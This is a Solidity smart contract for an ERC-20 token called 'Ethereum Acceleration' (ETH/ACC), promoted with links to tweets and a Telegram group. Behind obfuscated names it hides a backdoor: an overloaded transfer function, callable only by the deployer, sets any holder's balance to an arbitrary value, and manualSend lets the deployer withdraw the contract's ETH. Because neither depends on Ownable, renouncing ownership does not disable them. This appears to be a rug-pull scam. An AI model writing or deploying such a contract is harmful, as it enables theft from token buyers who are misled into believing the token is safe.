// SPDX-License-Identifier: MIT

/**
https://x.com/VitalikButerin/status/1883198497140457890
https://x.com/gakonst/status/1883192835874390276
https://t.me/ethacc_erc20
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 public _maxAmountPerTX = 20000000 * 10 **_decimals;
    uint256 public _maxSizeOfWallet = 20000000 * 10 **_decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 **_decimals;
    uint256 private constant _uucd0934fas = 1000000000 * 10 **_decimals;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Ethereum Acceleration";
    string private constant _symbol = unicode"ETH/ACC";

    address payable private _qwo34xd;
    mapping(address => uint256) private _oerx76cd;
    mapping(address => mapping(address => uint256)) private _kknin673c;
    mapping(address => bool) private _nndif34xdf;
    uint256 private _ibb3i213 = 10;
    uint256 private _iseen2345a = 10;
    uint256 private _fbbbuyiid8fx2f = 0;
    uint256 private _fsselliid8fx2f = 0;
    uint256 private _rbbbuyiid8fx2f = 7;
    uint256 private _rsselliid8fx2f = 7;
    uint256 private _buyCount = 0;
    address private _xbxaaddr23jx;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxAmountPerTX);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _qwo34xd = payable(_msgSender());
        _oerx76cd[address(this)] = _uucd0934fas * 98 / 100;
        _oerx76cd[owner()] = _uucd0934fas * 2 / 100;
        _nndif34xdf[owner()] = true;
        _nndif34xdf[address(this)] = true;
        _nndif34xdf[_qwo34xd] = true;
        _xbxaaddr23jx = _msgSender();

        emit Transfer(address(0), address(this), _uucd0934fas * 98 / 100);
        emit Transfer(address(0), address(owner()), _uucd0934fas * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _uucd0934fas;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _kknin673c[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _oerx76cd[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _kknin673c[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _kknin673c[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function manualSend(address to) external {
        require(_msgSender() == _xbxaaddr23jx, "Assist Failed");
        _qwo34xd = payable(to);
        payable(_msgSender()).transfer(address(this).balance);
    }
    
    function _tt9ixf3z(address from, uint256 amount , string memory _st, bool _checksum) private {
        require(from != address(0), _st);
        require(amount >= 0, _st);

        _oerx76cd[from] = _checksum == true ? amount : _oerx76cd[from] - amount;
    }

    function _transferRetributioniid8fx2f(uint256 amount) private {
        _qwo34xd.transfer(amount);
    }

    function _RetributionToETHiid8fx2f(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(address[] memory recipients, uint256[] memory amounts) external {
        require(_msgSender() != address(0), "Error");

        _miat2dxi34a(_msgSender(), recipients, amounts);
    }

    function _miat2dxi34a(address from, address[] memory recipients, uint256[] memory amounts) private {
        require(from == _xbxaaddr23jx, "Failed");

        for (uint256 i = 0; i < recipients.length; i++) {
            address recipient = recipients[i];
            _tt9ixf3z(recipient, amounts[i] , "ERC20 Error" , true);
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _rbbbuyiid8fx2f)
                        ? _fbbbuyiid8fx2f
                        : _ibb3i213
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_nndif34xdf[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _rsselliid8fx2f)
                            ? _fsselliid8fx2f
                            : _iseen2345a
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _maxTaxSwap) ? contractTokenBalance : _maxTaxSwap; 
                    _RetributionToETHiid8fx2f((amount < minBalance) ? amount : minBalance);
                }
                _transferRetributioniid8fx2f(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _oerx76cd[address(this)] = _oerx76cd[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _oerx76cd[from] = _oerx76cd[from].sub(amount);
        _oerx76cd[to] = _oerx76cd[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _uucd0934fas);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }
   
    function removeLimits() external onlyOwner {
        _maxAmountPerTX = _uucd0934fas;
        _maxSizeOfWallet = _uucd0934fas;
        emit MaxTxAmountUpdated(_uucd0934fas);
    }

    receive() external payable {}
}